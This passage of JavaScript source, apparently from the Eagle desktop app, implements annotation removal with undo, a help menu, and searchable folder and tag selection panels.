            if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
                var video = $(".detail-wrap video")[0];
                if (video && comment.duration !== undefined) {
                    video.currentTime = comment.duration;
                }
            }
        };

        $scope.removeVideoComment = (event, video, comment) => {
            event.stopPropagation();
            if (video.comments) {
                var idx = video.comments.indexOf(comment);
                if (idx > -1) {

                    var originComments = angular.copy(video.comments);

                    video.comments.splice(idx, 1);
                    ipcRenderer.send('image-change', video);
                    $bodyScope.updateItemView(video);
                    $rootScope.$broadcast("REBIND_REFRESH", true);
                    $rootScope.$broadcast("REFRESH_VIDEO_COMMENTS");

                    electronLog && electronLog.info(`[app] Remove video annotation: ${video.name}(${video.id})`);

                    var message = $filter('i18n')("notify.annotation.remove");
                    // 復原
                    $rootScope.notify({
                        message: message,
                        duration: 4000,
                    }, function () {
                        video.comments = originComments;
                        $rootScope.$broadcast("REBIND_REFRESH", true);
                        $rootScope.$broadcast("REFRESH_VIDEO_COMMENTS");
                        $bodyScope.updateItemView(video);
                        ipcRenderer.send('image-change', video);
                    });
                }
            }
        }

        $scope.removeComment = (item, index) => {
            const originComments = angular.copy(item.comments);

            item.comments.splice(index, 1);
            $rootScope.$broadcast("REBIND_REFRESH", true);
            ipcRenderer.send('image-change', item);

            electronLog && electronLog.info(`[app] Remove image annotation: ${item.name}(${item.id})`);

            const message = $filter('i18n')("notify.annotation.remove");
            // 復原
            $rootScope.notify({
                message: message,
                duration: 4000,
            }, () => {
                item.comments = originComments;
                $rootScope.$broadcast("REBIND_REFRESH", true);
                ipcRenderer.send('image-change', item);
            });
            AnnotationPreview.blur();
            AnnotationPreview.hide();
        };

        $scope.openHelpContextMenu = () => {
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('appmenu.app>about'),
                        icon: 'ic-eagle-logo.svg',
                        keywords: 'about アバウト 关于',
                        click: () => {
                            $rootScope.$broadcast("OPEN_ABOUT_PANEL");
                            $scope.$evalAsync;
                        }
                    },
                    {
                        label: i18n.__('appmenu.app>checkUpdate'),
                        icon: 'ic-check-for-update.svg',
                        keywords: 'check update 检查更新 檢查更新 アップデート',
                        click: () => {
                            IPCHelper.send('check-for-update', {
                                machineID: machineID,
                                showAlredy: true,
                            });
                        }
                    },
                    {
                        label: i18n.__('appmenu.app>preferences'),
                        icon: 'ic-settings.svg',
                        keywords: 'preferences 偏好设置 偏好設置 設定 設置 settings',
                        accelerator: 'CmdOrCtrl+,',
                        enabled: !$rootScope.isAppLocked,
                        click: () => {
                            if ($rootScope.isAppLocked) return;
                            ipcRenderer.send('open.preferences');
                        }
                    },
                    { role: 'separator' },
                    {
                        label: i18n.__("appmenu.help>helpCenter"),
                        icon: 'ic-help.svg',
                        keywords: 'help center 帮助中心 帮助中心 ヘルプセンター',
                        click: () => { $bodyScope.openHelpCenter(); }
                    },
                    {
                        label: i18n.__("appmenu.help>openTips"),
                        icon: 'ic-tips.svg',
                        keywords: 'tips 小技巧 小技巧 ヒント',
                        click: () => { $bodyScope.openGetStarted(); }
                    },
                    {
                        label: i18n.__('appmenu.help>shortcuts'),
                        icon: 'ic-shortcuts.svg',
                        keywords: 'shortcuts 快捷键 ショートカット',
                        click: () => { $bodyScope.openShortcuts(); $scope.$evalAsync(); }
                    },
                    { role: 'separator' },
                    // {
                    //     label: i18n.__('appmenu.help>roadmap'),
                    //     icon: 'ic-roadmap.svg',
                    //     keywords: 'roadmap 路线图 ロードマップ',
                    //     click: () => { $bodyScope.openRoadmap(); }
                    // },
                    {
                        label: i18n.__('appmenu.help>privacy'),
                        icon: 'ic-privacy.svg',
                        keywords: 'privacy 隐私 プライバシー',
                        click: () => { $bodyScope.openPrivacy(); }
                    },
                    {
                        label: "Eagle API",
                        icon: 'ic-developer.svg',
                        keywords: 'api developer 開發者 開發者 開発者',
                        click: () => { $bodyScope.openAPIDocument(); }
                    },
                    {
                        label: "Twitter - @eagle_app",
                        icon: 'ic-twitter.svg',
                        keywords: 'twitter social media 社交媒体 社交媒體 ソーシャルメディア',
                        click: () => { $bodyScope.openTwitter(); }
                    }
                ],
                showSearch: true,
            });
        }

    }
}));
EagleApp.directive('inspectorTags', () => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/inspector-tags.html',
        replace: true,
        link: ($scope, element, attrs, controllersArr) => {}
    }
});
EagleApp.directive('inspectorFolders', () => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/inspector-folders.html',
        replace: true,
        link: ($scope, element, attrs, controllersArr) => {}
    }
});
EagleApp.directive('inspectorAnnotations', () => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/inspector-annotations.html',
        replace: true,
        link: ($scope, element, attrs, controllersArr) => {}
    }
});
EagleApp.directive('inspectorInformation', () => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/inspector-information.html',
        replace: true,
        link: ($scope, element, attrs, controllersArr) => {}
    }
});
EagleApp.directive('inspectorPlugin', () => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/inspector-plugin.html',
        replace: true,
        link: ($scope, element, attrs, controllersArr) => {}
    }
});
EagleApp.directive('tagManager', function($timeout, $rootScope, $filter) {
    return {
        replace: true,
        restrict: 'E',
        templateUrl: 'js/directives/tag-manager.html',
        link: function ($scope, element, attrs, controllersArr) {
            let resizeTimeout;
            $(window).on("resize.tagManager", () => {
                if ($scope.viewMode !== "alltags") return;
                clearTimeout(resizeTimeout);
                resizeTimeout = setTimeout(() => {
                    $scope.TagManager.renderTagsResult();
                    $scope.$evalAsync();
                }, 50);
            });
        }
    }
});
// 實做 Panel Keyboard 事件監聽相關功能，將 keycode keyup / keydown 等邏輯抽象化
class SelectPanelSearchInput {

    enterKeydown
    $input
    onChange
    onEnterKey
    onEscKey
    onTabKey
    onUpKey
    onDownKey
    onLeftKey
    onRightKey
    onPaste

    constructor(params) {
        this.$input = $(params.selector);
        this.onChange = params.onChange || function () {};
        this.onEnterKey = params.onEnterKey || function () {};
        this.onEscKey = params.onEscKey || function () {};
        this.onTabKey = params.onTabKey || function () {};
        this.onUpKey = params.onUpKey || function () {};
        this.onDownKey = params.onDownKey || function () {};
        this.onLeftKey = params.onLeftKey || function () {};
        this.onRightKey = params.onRightKey || function () {};
        this.onPaste = params.onPaste || function () {};
        this.enterKeydown = false;
        this.escKeydown = false;

        // HACK: 中文輸入法的 enter 不會有完整的 keydown + keyup，所以這邊用 enterKeydown 確保是一次完整的 enter keydown + keyup 事件
        this.$input.off('keyup').on('keyup', (event) => {
            switch (event.keyCode) {
                case 13: // enter
                    if (this.enterKeydown) {
                        this.onEnterKey(event);
                        this.enterKeydown = false;
                    }
                    break;
                case 27: // esc
                    if (this.escKeydown) {
                        event.preventDefault();
                        event.stopPropagation();
                        this.onEscKey();
                        this.escKeydown = false;
                    }
                    break;
            }
        });

        this.$input.off('keydown').on('keydown', (event) => {
            switch (event.keyCode) {
                case 9: // tab
                    if (this.onTabKey !== undefined) {
                        event.preventDefault();
                        event.stopPropagation();
                        this.onTabKey(event);
                    }
                    break;
                case 13: // enter
                    event.preventDefault();
                    if (event.metaKey || event.ctrlKey) {
                        this.onEnterKey(event);
                    }
                    else {
                        this.enterKeydown = true;
                    }
                    break;
                case 37: // left
                    this.onLeftKey(event);
                    break;
                case 39: // right
                    this.onRightKey(event);
                    break;
                case 38: // up
                    event.preventDefault();
                    this.onUpKey();
                    break;
                case 40: // down
                    event.preventDefault();
                    this.onDownKey();
                    break;
                case 27: // esc
                    event.preventDefault();
                    this.escKeydown = true;
                    break;
                default:
                    break;
            }
        });

        this.$input.off('paste').on('paste', (event) => {
            this.onPaste(event);
        });

        // off and bing jquery input change event
        this.$input.off('input').on('input', (event) => {
            this.onChange();
        });
    }

    focus () {
        this.$input.focus();
    }

    blur () {
        this.$input.blur();
    }
} 


class SelectPanel {

    searchInput
    searchKeyword
    listData
    $panel
    
    // 事件 callbacks
    onOpened
    onClosed

    scope

    constructor(params) {

        this.scope = params.scope;
        this.$panel = $(params.panelSelector);

        // 初始化搜尋輸入框、回呼函式
        this.searchInput = new SelectPanelSearchInput({
            scope: params.scope,
            selector: params.searchInputSelector,
            onChange: () => {
                this.listData.searchKeyword = this.searchInput.$input.val();
                this.keywordChanged();
                this.scope.$evalAsync();
            },
            onEnterKey: (event) => {
                let item = this.listData.items[this.listData.currentIndex];
                if (item) {
                    this.openItem(event, item);
                    this.scope.$evalAsync();
                }
            },
            onEscKey: () => { 
                this.close();
                this.scope.$evalAsync();
            },
            onTabKey: (event) => {
                this.onTabKey(event);
                this.scope.$evalAsync();
            },
            onUpKey: () => {
                this.selectUp(); 
                this.scope.$evalAsync();
            },
            onDownKey: () => { 
                this.selectDown();
                this.scope.$evalAsync();
            },
            onLeftKey: (event) => {
                this.onLeftKey(event);
                this.scope.$evalAsync();
            },
            onRightKey: (event) => {
                this.onRightKey(event);
                this.scope.$evalAsync();
            },
            onPaste: (event) => {
                this.onPaste(event);
                this.scope.$evalAsync();
            },
        });
    }

    init (params) {
        this.reset();
        this.panelHeight = this.$panel.height();
        // 初始化事件 callbacks
        this.onOpened = params.onOpened || (() => {});
        this.onClosed = params.onClosed || (() => {});
    }

    reset() {
        if (!this.listData) {
            this.listData = {
                items: [],
                currentIndex: -1,
                searchKeyword: "",
            };
        }
        this.listData.items = [];
        this.listData.currentIndex = -1;
        this.listData.searchKeyword = "";
        this.clearSearchInput();
    }

    // 打開 Panel
    open () {
        if (this.$panel.hasClass("open")) {
            this.onOpened();
            setTimeout(() => {
                this.searchInput.focus();
            }, 50);   
            return;
        }
        this.#moveToCursorPosition(() => {
            this.$panel.addClass("open");
            this.onOpened();
            setTimeout(() => {
                this.searchInput.focus();
            }, 50);
        }, 0);
    }

    // 關閉 Panel
    close () {
        this.scrollTop();
        this.$panel.removeClass("open");
        this.searchInput.blur();
        this.reset();
        this.onClosed();
    }

    // 選擇上一個項目
    selectUp () {
        if (this.listData.currentIndex > 0) {
            let prevIdx = this.listData.currentIndex - 1;
            let prevItem = this.listData.items[prevIdx];
            if (!prevItem) return;
            this.listData.currentIndex = prevIdx;
            if (!this.isItemSelectable(prevItem)) {
                this.selectUp();
            }
        }
    }

    // 選擇下一個項目
    selectDown () {
        if (this.listData.currentIndex < this.listData.items.length - 1) {
            let nextIdx = this.listData.currentIndex + 1;
            let nextItem = this.listData.items[nextIdx];
            if (!nextItem) return;
            this.listData.currentIndex = nextIdx;
            if (!this.isItemSelectable(nextItem)) {
                this.selectDown();
            }
        }
    }

    // 父類不實作，由子類實作
    openItem (event, item) {
        throw new Error('You have to implement the method doSomething!');
    }

    onTabKey () {
        
    }

    onPaste () {
    }

    // 滑鼠懸停項目
    hoverItem (index) {
        this.listData.currentIndex = index;
    }

    focusSearchInput () {
        this.searchInput.focus();
    }

    clearSearchInput () {
        this.searchInput.$input.val("");
    }

    keywordChanged () {
        throw new Error('You have to implement the method doSomething!');
    }

    // 判斷項目是否可選擇
    isItemSelectable (item) {
        throw new Error('You have to implement the method doSomething!');
    }

    scrollTop () {
        this.$panel.find("select-panel-list").scrollTop(0);
    }

    #moveToCursorPosition(callback, retry) {
        const windowWidth = $(window).width();
        const windowHeight = $(window).height();
        const containerWidth = this.$panel.width();
        const containerHeight = this.$panel.height();
        let x = windowMouseX + 10; 
        let y = windowMouseY - 10;
        let maxHeight = windowHeight; // 初始化最大高度為視窗高度
    
        // NOTE: 避免尚未完成渲染的時候，取得的 containerHeight 為 0
        if (!this.fixedSize) {
            if (retry < 30 && (containerHeight === this.panelHeight)) {
                setTimeout(() => {
                    this.#moveToCursorPosition(callback, retry + 1);
                }, 5);
                return;
            }
        }

        if (windowMouseX + containerWidth > windowWidth) {
            x = windowMouseX - containerWidth - 20;
        }
    
        if (windowMouseY + containerHeight > windowHeight - 20) {
            y = windowHeight - containerHeight - 20;
            y = y < 20 ? 20 : y;
        }
        else if (windowMouseY - 56 < 0) {
            y = 36;
        }

        maxHeight = windowHeight - y - 80;
    
        this.$panel.css({
            left: `${x}px`,
            top: `${y}px`,
        });

        // find [select-panel-list] and set max-height
        this.$panel.find("select-panel-list").css({
            'max-height': `${maxHeight - 40}px` // 設定最大高度
        });

        callback();
    };
}
class FolderSelectPanel extends SelectPanel {
    
    originalParams
    searchKeyword
    rawData
    onChanged
    collapsedFolderIds = {}

    static open(params) {
        const $rootScope = angular.element("html").scope();
        $rootScope.$broadcast('FOLDER.SELECT.PANEL.OPEN', params);
    }

    constructor(params) {
        super(params);
        this.collapsedFolderIds = {};
    }

    init (params) {
        this.originalParams = params;
        super.init(params);
        this.reset();
        this.initRawData(params);
        this.updateItemList();
        this.onChanged = params.onChanged || (() => {});
    }

    reset () {
        super.reset();
        if (localStorage['eagle.folderSelectPanel.collapsedFolderIds']) {
            try {
                this.collapsedFolderIds = JSON.parse(localStorage['eagle.folderSelectPanel.collapsedFolderIds']);
            }
            catch (e) {
                this.collapsedFolderIds = {};
            }
        }
        this.listData.selectedIds = {};
        this.listData.currentTab = 'ALL';  // 'ALL' or 'RECENT' or 'SELECTED'
        this.rawData = {
            folders: [],
            selectedIds: {},
            recentFolderIds: {},
            folderList: [],
            foldersMap: {},
            foldersDepthMap: {},
        };
    }
    
    // 初始化資料
    initRawData(params) {

        let guidelinesMap = {};

        // 計算資料夾的深度、建立資料夾的 Map、List、DepthMap
        this.rawData = {
            folders: params.folders || [],
            selectedIds: params.selectedIds || {},
            recentFolderIds: {},
            folderList: [],
            foldersMap: {},
            folderItemsMap: {},
            foldersDepthMap: {}
        };

        let recentFolderIdx = 0;
        const recentFolderIds = $bodyScope.getRecentFolders().reduce((acc, cur) => {
            acc[cur.id] = recentFolderIdx++;
            return acc;
        }, {});
        this.rawData.recentFolderIds = recentFolderIds;


        this.listData.maxDepth = 0;
        eagle.utils.tree.walk(this.rawData.folders, 'children', (folder, parent, depth) => {

            const { id, name, icon, iconColor, pinyin } = folder;

            this.rawData.folderList.push(folder);
            this.rawData.foldersMap[id] = folder;
            this.rawData.foldersDepthMap[id] = depth;

            // 計算 guidelines 顏色及數量
            let guidelines = [];
            if (parent && guidelinesMap[parent.id]) {
                const parentGuidelines = guidelinesMap[parent.id];
                guidelines = [...parentGuidelines, folder.iconColor || 'normal'];
            }
            else {
                guidelines = [folder.iconColor || 'normal'];
            }

            guidelinesMap[folder.id] = guidelines;

            const hasChildren = folder.children && folder.children.length > 0;

            const item = {
                type: 'folder',
                id: id,
                name: name,
                pinyin: pinyin,
                path: this.getFolderParentPath(folder),
                icon: icon,
                iconColor: iconColor,
                depth: this.rawData.foldersDepthMap[id],
                size: 26,
                parent: parent?.id,
                parentItem: this.rawData.folderItemsMap[parent?.id],
                guidelines: guidelines,
                hasChildren: hasChildren
            };

            this.rawData.folderItemsMap[id] = item;

            if (this.listData.maxDepth < depth) {
                this.listData.maxDepth = depth;
            }
        });

        // 設定預設已選擇的資料夾
        this.listData.selectedIds = { ...this.rawData.selectedIds };
    }

    // 建立 View Model 使用的資料，並更新畫面 
    updateItemList (keepIndex = false) {
        if (!keepIndex) {
            this.listData.currentIndex = -1;
        }
        this.listData.items = [];
        
        const searchKeyword = this.listData.searchKeyword;
        const folderList = this.rawData.folderList;
        let showCreateFolderBtn = (searchKeyword !== "");
        let folders = [];           // 全部資料夾
        let recentFolders = [];     // 最近使用的資料夾
        let recentFoldersCount = 5;

        folderList.forEach((folder) => {
            const { id, name } = folder;
            const item = this.rawData.folderItemsMap[id];
            const newItem = { ...item };
            const isSelected = this.listData.selectedIds[id];

            if (isSelected) {
                recentFoldersCount++;
            }
            
            if (this.rawData.recentFolderIds[id] >= 0 || isSelected) {
                const recentItem = { ...item };
                recentItem.depth = 0;
                recentItem.isRecent = true;
                recentFolders.push(recentItem);
            }

            if (searchKeyword) {
                folders.push(newItem);
            }
            else if (this.isVisible(newItem)) {
                folders.push(newItem);
            }

            if (name === searchKeyword) {
                showCreateFolderBtn = false;
            }
        });

        // 排序最近使用的資料夾
        recentFolders = recentFolders.sort((a, b) => {
            const aIdx = this.rawData.recentFolderIds[a.id];
            const bIdx = this.rawData.recentFolderIds[b.id];
            if (aIdx < bIdx) return -1;
            if (aIdx > bIdx) return 1;
            return 0;
        });

        recentFolders = recentFolders.sort((a, b) => {
            if (this.rawData.selectedIds[a.id] && !this.rawData.selectedIds[b.id]) return -1;
            if (!this.rawData.selectedIds[a.id] && this.rawData.selectedIds[b.id]) return 1;
            return 0;
        });

        // 已選的資料夾排在前面
        recentFolders = recentFolders.sort((a, b) => {
            if (this.listData.selectedIds[a.id] && !this.listData.selectedIds[b.id]) return -1;
            if (!this.listData.selectedIds[a.id] && this.listData.selectedIds[b.id]) return 1;
            return 0;
        });

        // 全部
        if (this.listData.currentTab === 'ALL') {
            let filteredRecentFolders = this.filterByKeyword(recentFolders);
			filteredRecentFolders = filteredRecentFolders.slice(0, recentFoldersCount);
			folders = this.filterByKeyword(folders);

			// 如果是搜尋狀態，將資料夾中有出現在最近使用的資料夾隱藏不顯示
			if (searchKeyword !== "") {
				folders = folders.filter((folder) => {
					return !filteredRecentFolders.find((recentFolder) => recentFolder.id === folder.id);
				});
			}

			// 顯示最近使用的資料夾
			if (filteredRecentFolders.length > 0) {
				if (folders.length > 0) {
					this.listData.items = [...filteredRecentFolders, { type: "separator", size: 5 }, ...folders];
				} else {
					this.listData.items = [...filteredRecentFolders];
				}
			}
			// 沒有最近使用資料夾，只顯示全部資料夾
			// 如果總資料夾數量小於 10，就不顯示最近使用資料夾
			else {
				this.listData.items = [...folders];
			}
        }
        // 最近使用
        else if (this.listData.currentTab === 'RECENT') {
            recentFolders = this.filterByKeyword(recentFolders);
            this.listData.items = [...recentFolders.slice(0, 20)];
        }
        // 已選擇
        else if (this.listData.currentTab === 'SELECTED') {
            folders = folders.filter((folder) => {
                return this.listData.selectedIds[folder.id];
            });
            this.listData.items = [...folders];
        }

        // 顯示建立資料夾按鈕
        if (showCreateFolderBtn) {
            if (this.listData.items.length > 0) {
                this.listData.items = [...this.listData.items, { type: 'separator', size: 5 }, { type: 'create', size: 26, 'name': searchKeyword }];
            }
            else {
                this.listData.items = [{ type: 'create', size: 26, 'name': searchKeyword }];
            }
        }

        // 更新 index
        this.listData.items.forEach((item, index) => {
            item.index = index;
        });
        
        if (!keepIndex) {
            // 搜尋結果有內容時，自動選擇第一個項目
            if (searchKeyword !== "" && this.listData.items.length > 0) {
                this.listData.currentIndex = 0;
            }
            // 如果不是搜尋狀態，就不自動選擇第一個項目
            else {
                this.listData.currentIndex = -1;
            }
        }
    }

    isVisible (item) {
        // 判斷是否所有父層都是展開的
        const parentId = item.parent;
        if (parentId) {
            const parentItem = this.rawData.folderItemsMap[parentId];
            if (!parentItem) return false;
            if (this.collapsedFolderIds[parentId]) return false;
            return this.isVisible(parentItem);
        }
        return true;
    }

    filterByKeyword (list) {
        if (this.listData.searchKeyword.length === 0) return list;

        const keyword_cn = chineseConvert.tw2cn(this.listData.searchKeyword).trim();
        const temp = list.map(item => {
            const nameCN = chineseConvert.tw2cn(item.name);
            if (item.name.length >= 30) {
                return {
                    item: item,
                    name: nameCN,
                    search: [nameCN]
                }
            }
            return {
                item: item,
                name: nameCN,
                search: [nameCN, ..._.uniq(
                    cartesianProduct(pinyinlite(nameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                    .map(item => item.join(' '))
                )],
            };
        });

        let scores = temp.map(item => {
            const itemName = `${item.name ?? ''} ${item.keywords ?? ''}`;
            return {
                item: item,
                name: itemName,
                score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
            };
        });

        list = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
            return i.item.item;
        });

        // sort start with keyword first
        const result = list.reduce((acc, cur) => {
            if (cur.name.toLowerCase().startsWith(this.listData.searchKeyword.toLowerCase())) {
                acc.startWithKeyword.push(cur);
            }
            else {
                acc.notStartWithKeyword.push(cur);
            }
            return acc;
        }, {
            startWithKeyword: [],
            notStartWithKeyword: [],
        });
        
        list = [...result.startWithKeyword, ...result.notStartWithKeyword];
       
        return list;
    }

    // 取得回傳結果
    getCallbackResult () {
        const isEqual = (a, b) => {
            const aEntries = Object.entries(a);
            const bEntries = Object.entries(b);
            return aEntries.length === bEntries.length && aEntries.every(([key, value]) => b[key] === value);
        };

        const isDirty = !isEqual(this.rawData.selectedIds, this.listData.selectedIds);
        const selectedFolderIds = { ...this.listData.selectedIds };
        const deselectedFolderIds = Object.entries(this.rawData.selectedIds).reduce((result, [folderId, isSelected]) => {
            if (!this.listData.selectedIds[folderId]) {
                result[folderId] = true;
            }
            return result;
        }, {});

        return { isDirty, selectedFolderIds, deselectedFolderIds };
    }

    getFolderParentPath (folder) {
        const parentFolder = this.rawData.foldersMap[folder.parent];
        const grandParentFolder = this.rawData.foldersMap[parentFolder?.parent];
        const greatGrandParentFolder = this.rawData.foldersMap[grandParentFolder?.parent];
        const parentFolderName = parentFolder?.name;
        const grandParentFolderName = grandParentFolder?.name;
        const greatGrandParentFolderName = greatGrandParentFolder?.name;
        let result = "";
        if (greatGrandParentFolderName && grandParentFolderName && parentFolderName) {
            result = `../<span>${grandParentFolderName}</span>/<span>${parentFolderName}</span>`;
        }
        else if (!greatGrandParentFolderName && grandParentFolderName && parentFolderName) {
            result = `<span>${grandParentFolderName}</span>/<span>${parentFolderName}</span>`;
        }
        else if (!greatGrandParentFolderName && !grandParentFolderName && parentFolderName) {
            result = `${parentFolderName}`;
        }
        return result;
    }

    close () {
        const result = this.getCallbackResult();
        if (result.isDirty) this.onChanged(result);
        super.close();
        this.reset();
    }

    onTabKey () {
        if (this.listData.currentTab === 'ALL') {
            this.listData.currentTab = 'RECENT';
        }
        else if (this.listData.currentTab === 'RECENT') {
            this.listData.currentTab = 'SELECTED';
        }
        else if (this.listData.currentTab === 'SELECTED') {
            this.listData.currentTab = 'ALL';
        }
        this.updateItemList();
    }

    openItem (event, item) {
        if (item.type === 'create') {
            this.createFolder(this.listData.searchKeyword.trim(), (folderName) => {
                $bodyScope.createFolder({
                    name: folderName.trim(),
                    position: "top",
                    callback: (folder) => {
                        this.onCreatedFolder(folder);
                    }
                })
            });
        }
        else {
            const pressCtrlOrCmd = event?.ctrlKey || event?.metaKey;
            const itemId = item.id;
            const selectedIds = this.listData.selectedIds;
            (!selectedIds[itemId])? selectedIds[itemId] = true : delete selectedIds[itemId];
            if (this.listData.searchKeyword !== "" && !pressCtrlOrCmd) {
                this.listData.searchKeyword = "";
                this.clearSearchInput();
                this.updateItemList();
            }
        }
    }

    openItemSubmenu (item) {
        if (item.isRecent) {
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('selectFolderPanel.context.removeHistory'),
                        click: () => {
                            $bodyScope.removeRecentFolder(item.id, () => {
                                const selectedIds = { ...this.listData.selectedIds };
                                this.reset();
                                this.init(this.originalParams);
                                this.listData.selectedIds = selectedIds;
                                this.updateItemList();
                            });
                        }
                    }
                ],
                onClosed: () => {
                    this.focusSearchInput();
                }
            });
        }
        else {
            ContextMenu.open({
                items: [
                    {
                        label: i18n.__('selectFolderPanel.context.addChilderFolder'),
                        icon: 'ic-folder-new-sub-folder.svg',
                        click: () => {
                            this.createFolder("", (folderName) => {
                                $bodyScope.createFolder({
                                    name: folderName,
                                    parentID: item.id,
                                    callback: (folder) => {
                                        this.onCreatedFolder(folder);
                                    }
                                })
                            });
                        }
                    },
                    {
                        label: i18n.__('selectFolderPanel.context.addSiblingFolder'),
                        icon: 'ic-expand-same.svg',
                        click: () => {
                            this.createFolder("", (folderName) => {
                                $bodyScope.createFolder({
                                    name: folderName,
                                    sibling: item,
                                    callback: (folder) => {
                                        this.onCreatedFolder(folder);
                                    }
                                })
                            });
                        }
                    }
                ],
                onClosed: () => {
                    this.focusSearchInput();
                }
            });
        }
    }

    changeTab (tab) {
        this.listData.currentTab = tab;
        this.updateItemList();
    }

    keywordChanged () {
        this.updateItemList();
    }

    isItemSelectable (item) {
        const selectableTypes = { 'folder': true, 'create': true };
        return selectableTypes[item.type];
    }

    createFolder (defaultName = "", callback) {
        swal({
			html: `
				<div class="alert">
					<div class="alert-icon create"></div>
					<h4 class="alert-title">${i18n.__("selectFolderPanel.createFolder.title")}</h4>
				</div>
			`,
            showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
			customClass: "alert-box",
            input: 'text',
            inputPlaceholder: i18n.__("selectFolderPanel.createFolder.placeholder"),
            inputValue: defaultName,
            cancelButtonColor: "#777777",
            confirmButtonText: i18n.__("selectFolderPanel.createFolder.button"),
            cancelButtonText: i18n.__("general.cancel"),
        }).then((result) => {
            var name = result;
            callback(name);
            this.focusSearchInput();
        }, () => {
            this.focusSearchInput();
        });
    }

    onCreatedFolder (folder) {
        const selectedIds = { ...this.listData.selectedIds };
        selectedIds[folder.id] = true;
        this.reset();
        this.init(this.originalParams);
        this.listData.selectedIds = selectedIds;
        this.updateItemList();
    }

    toggleExpand (item) {
        if (this.collapsedFolderIds[item.id]) {
            this.expand(item);
        }
        else {
            this.collapse(item);
        }
    }

    expand (item) {
        delete this.collapsedFolderIds[item.id];
        this.updateItemList(true);
        try { localStorage['eagle.folderSelectPanel.collapsedFolderIds'] = JSON.stringify(this.collapsedFolderIds); } catch (e) { console.error(e); }
    }

    collapse (item) {
        this.collapsedFolderIds[item.id] = true;
        this.updateItemList(true);
        try { localStorage['eagle.folderSelectPanel.collapsedFolderIds'] = JSON.stringify(this.collapsedFolderIds); } catch (e) { console.error(e); }
    }

    onLeftKey() {
        const currentItem = this.listData.items[this.listData.currentIndex];
        if (currentItem && currentItem.type === 'folder') {
            this.collapse(currentItem);
        }
    }

    onRightKey() {
        const currentItem = this.listData.items[this.listData.currentIndex];
        if (currentItem && currentItem.type === 'folder') {
            this.expand(currentItem);
        }
    }
}

EagleApp.directive('folderSelectPanel', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/folder-select-panel.html',
        replace: false,
        scope: {
            theme: '=theme'
        },
        link: (scope) => {

            const panel = new FolderSelectPanel({
                scope: scope,
                panelSelector: "#folder-select-panel",
                searchInputSelector: "#folder-select-panel-search-input",
            });

            scope.$on('FOLDER.SELECT.PANEL.OPEN', (event, params) => {

                panel.init(params);

                $timeout(() => {
                    panel.open();
                }, 50);

                Object.assign(scope, {
                    collapsedFolderIds: panel.collapsedFolderIds,
                    listData: panel.listData,
                    toggleExpand: (item) => {
                        panel.toggleExpand(item);
                    },
                    expand: (item) => {
                        panel.expand(item);
                    },
                    collapse: (item) => {
                        panel.collapse(item);
                    },
                    openItem: (event, item) => {
                        panel.openItem(event, item);
                    },
                    openItemSubmenu: (item) => {
                        panel.openItemSubmenu(item);
                    },
                    hoverItem: (item) => {
                        panel.hoverItem(item.index);
                    },
                    close: () => {
                        panel.close();
                    },
                    focusSearchInput: () => {
                        panel.focusSearchInput();
                    },
                    changeTab: (tab) => {
                        panel.changeTab(tab);
                    }
                });

            });
        }
    }
})
class TagSelectPanel extends SelectPanel {
    
    originalParams
    searchKeyword
    rawData
    onChanged
    pinSelected = true

    static open(params) {
        const $rootScope = angular.element("html").scope();
        $rootScope.$broadcast('TAG.SELECT.PANEL.OPEN', params);
    }

    constructor(params) {
        super(params);
    }

    init (params) {
        this.originalParams = params;
        super.init(params);
        this.pinSelected = params.pinSelected ?? true;
        this.reset();
        this.initRawData(params);
        this.updateItemList();
        this.onChanged = params.onChanged || (() => {});
        this.showCreateTagBtn = params.showCreateTagBtn ?? true;
    }

    reset () {
        super.reset();
        this.listData.selectedTags = {};
        this.rawData = {
            tags: [],
            tagItemsMap: {},
            tagGroups: [],
            tagGroupsMap: {},
            selectedTags: {},
        };
    }
    
    // 初始化資料
    initRawData(params) {

        this.rawData = {
            tagManager: params.tagManager,
            tags: angular.copy(params.tagManager.allTags) || [], // tag object > { name: "", color: "" }
            tagItemsMap: {},
            tagGroups: angular.copy(params.tagManager.groups) || [],
            tagGroupsMap: {},
            tagGroupsIndexMap: {},
            selectedTags: params.selectedTags || {},
            recentTagsMap: {},
        };

        // 建立 TagGroup map
        this.rawData.tagGroupsMap["none"] = {};
        this.rawData.tagGroups.forEach((tagGroup, index) => {
            this.rawData.tagGroupsMap[tagGroup.id] = tagGroup;
            this.rawData.tagGroupsIndexMap[tagGroup.id] = index;
        });
        
        // 建立 item list
        this.rawData.tags.forEach((tag) => {
            const { name, pinyin, groups, imageCount } = tag;
            const group = groups[0];
            let groupsMap = groups.reduce((acc, cur) => {
                acc[cur] = true;
                return acc;
            }, {});
            
            if (!group) groupsMap['none'] = true;

            const item = {
                type: 'tag',
                id: name,
                name: name,
                color: (group)? this.rawData.tagGroupsMap[group].color : undefined,
                size: 26,
                group: group || 'none',
                groups: groups,
                groupsMap: groupsMap,
                pinyin: pinyin,
                imageCount: imageCount
            };
            this.rawData.tagItemsMap[name] = item;
        });

        // 將 selectedTags 中不存在的標籤，加入到 rawData.tags 中
        Object.keys(this.rawData.selectedTags).forEach((name) => {
            if (!this.rawData.tagItemsMap[name]) {
                const item = {
                    type: 'tag',
                    id: name,
                    name: name,
                    color: undefined,
                    size: 26,
                    group: 'none',
                    groups: [],
                    groupsMap: { 'none': true },
                    pinyin: tinyPinyin.convertToPinyin(name),
                    imageCount: 0
                };
                this.rawData.tagItemsMap[name] = item;
                this.rawData.tags.push(item);
            }
        });
        
        let recentTagIdx = 1;
        const recentTagsMap = params.tagManager.historyTags.filter(tag => this.rawData.tagItemsMap[tag] !== undefined).slice(0, 12).reduce((acc, cur) => {
            acc[cur] = recentTagIdx++;
            return acc;
        }, {});
        this.rawData.recentTagsMap = recentTagsMap;
        
        // 設定預設已選擇的標籤
        this.listData.selectedTags = { ...this.rawData.selectedTags };
